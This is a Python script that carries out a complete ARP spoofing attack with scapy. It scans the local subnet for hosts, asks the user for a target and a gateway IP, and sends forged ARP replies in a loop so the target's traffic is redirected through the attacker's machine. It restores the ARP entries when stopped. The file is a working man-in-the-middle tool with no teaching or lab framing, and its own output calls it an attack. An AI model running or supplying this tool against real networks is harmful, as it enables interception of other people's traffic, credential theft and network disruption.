import psutil
from scapy.all import ARP, Ether, srp, send
import socket
import time

def get_network_interfaces():
    interfaces = psutil.net_if_addrs()
    return interfaces

def get_ip_address(interface):
    addresses = psutil.net_if_addrs()[interface]
    for address in addresses:
        if address.family == socket.AF_INET:
            return address.address
    return None

def scan_network(ip_range):
    arp_request = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request

    result = srp(packet, timeout=2, verbose=False)[0]

    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

    return clients

def arp_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Could not find MAC address for target IP: {target_ip}")
        return

    # Construct the ARP packet to spoof the target
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at")
    send(arp_response, verbose=False)

def restore_arp(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        return

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac, op="is-at")
    send(arp_response, count=4, verbose=False)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request

    result = srp(packet, timeout=2, verbose=False)[0]

    if result:
        return result[0][1].hwsrc
    else:
        return None

if __name__ == "__main__":
    interfaces = get_network_interfaces()

    print("Available network interfaces:")
    for i, interface in enumerate(interfaces):
        print(f"{i}. {interface}")

    choice = int(input("Select an interface (number): "))
    selected_interface = list(interfaces.keys())[choice]
    local_ip = get_ip_address(selected_interface)

    if local_ip is None:
        print("Unable to get IP address for the selected interface.")
    else:
        ip_range = '.'.join(local_ip.split('.')[:3]) + '.1/24'
        print(f"Scanning network: {ip_range}")

        devices = scan_network(ip_range)

        print("Available devices in the network:")
        print("IP" + " "*18 + "MAC")
        for device in devices:
            print(f"{device['ip']:<20}{device['mac']}")

        target_ip = input("Enter the target IP address for ARP spoofing: ")
        gateway_ip = input("Enter the gateway IP address to spoof: ")

        try:
            print(f"Starting ARP spoofing attack on target {target_ip} pretending to be {gateway_ip}")
            while True:
                arp_spoof(target_ip, gateway_ip)
                time.sleep(2)
        except KeyboardInterrupt:
            print("ARP spoofing attack stopped. Restoring network...")
            restore_arp(target_ip, gateway_ip)
            print("Network restored.")
